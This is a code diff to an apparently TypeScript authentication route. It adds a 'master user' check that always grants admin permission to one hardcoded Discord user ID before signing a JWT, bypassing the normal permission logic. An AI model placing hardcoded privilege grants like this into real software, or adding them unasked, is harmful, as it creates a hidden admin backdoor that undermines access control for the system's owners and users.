@@ -74,6 +74,11 @@ auth.post("/sync", zValidator("json", syncSchema), async (c) => {
       ),
     ];
 
+    // Master user: always grant admin
+    if (discordUser.id === "195412349153312768" && !permissions.includes("admin")) {
+      permissions.push("admin");
+    }
+
     // Build JWT
     const token = await new SignJWT({ userId: user.id, permissions })
       .setProtectedHeader({ alg: "HS256" })
